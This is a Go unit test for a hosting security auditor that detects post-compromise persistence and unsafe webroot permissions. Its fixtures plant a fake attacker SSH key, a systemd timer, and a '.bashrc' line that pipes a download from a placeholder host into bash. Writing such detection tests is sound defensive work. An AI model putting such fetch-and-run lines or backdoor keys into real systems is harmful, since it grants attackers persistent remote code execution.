package audit

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// Ways back in after a takeover: a new SSH key, systemd user units, a
// shell profile that downloads and runs something, an at job; a key added
// long ago and an ordinary profile stay quiet. A 0777 webroot folder is
// reported, a sticky shared one is not.
func TestPersistenceAndWritableFolders(t *testing.T) {
	home := t.TempDir()
	quiet := t.TempDir()
	put := func(p, body string) string {
		os.MkdirAll(filepath.Dir(p), 0o755)
		os.WriteFile(p, []byte(body), 0o600)
		return p
	}
	put(filepath.Join(home, ".ssh/authorized_keys"), "ssh-ed25519 AAAAC3inert attacker@vps\n")
	put(filepath.Join(home, ".config/systemd/user/update.timer"), "[Timer]\nOnCalendar=*:0/5\n")
	put(filepath.Join(home, ".bashrc"), "alias ll='ls -l'\ncurl -s https://example.invalid/x | bash\n")
	old := put(filepath.Join(quiet, ".ssh/authorized_keys"), "ssh-rsa AAAAB3inert dev@laptop\n")
	os.Chtimes(old, time.Now().AddDate(0, -2, 0), time.Now().AddDate(0, -2, 0))
	put(filepath.Join(quiet, ".bashrc"), "export PATH=$HOME/bin:$PATH\nalias wpcli='php ~/wp-cli.phar'\n")
	a := &Auditor{Accounts: func() []Account { return []Account{{"thief", home}, {"owner", quiet}} }, AtDir: t.TempDir()}
	got := map[string]string{}
	for _, it := range a.persistence() {
		got[it.Title] = it.Owner + " " + it.Severity
		if strings.Contains(it.Detail, "AAAAC3") {
			t.Errorf("key material in the report: %s", it.Detail)
		}
	}
	want := map[string]string{
		"SSH key added or changed in the last 7 days":       "thief medium",
		"systemd user units in a hosting account":           "thief medium",
		"Shell profile starts a download or hidden program": "thief high",
	}
	if len(got) != len(want) {
		t.Fatalf("items: %v", got)
	}
	for k, v := range want {
		if got[k] != v {
			t.Errorf("%s: %q", k, got[k])
		}
	}

	root := t.TempDir()
	os.MkdirAll(filepath.Join(root, ".tmb"), 0o755)
	os.Chmod(filepath.Join(root, ".tmb"), 0o777)
	os.MkdirAll(filepath.Join(root, "shared"), 0o755)
	os.Chmod(filepath.Join(root, "shared"), 0o777|os.ModeSticky)
	os.MkdirAll(filepath.Join(root, "wp-content"), 0o755)
	put(filepath.Join(root, "app/.git/config"), "[core]\n")
	put(filepath.Join(root, "vendor/x/.git/HEAD"), "ref: x\n") // no config: not a repository copy
	w := &Auditor{Docroots: func() map[string]string { return map[string]string{root: "example.com"} }}
	items, _, _ := w.webroots(t.Context())
	var ww []string
	repos := 0
	for _, it := range items {
		if it.Check == "world_writable" {
			ww = append(ww, filepath.Base(it.Path))
		}
		if it.Check == "exposed_repo" {
			repos++
		}
	}
	if repos != 1 {
		t.Errorf("git repositories: %d", repos)
	}
	if len(ww) != 1 || ww[0] != ".tmb" {
		t.Fatalf("world-writable folders: %v", ww)
	}
}
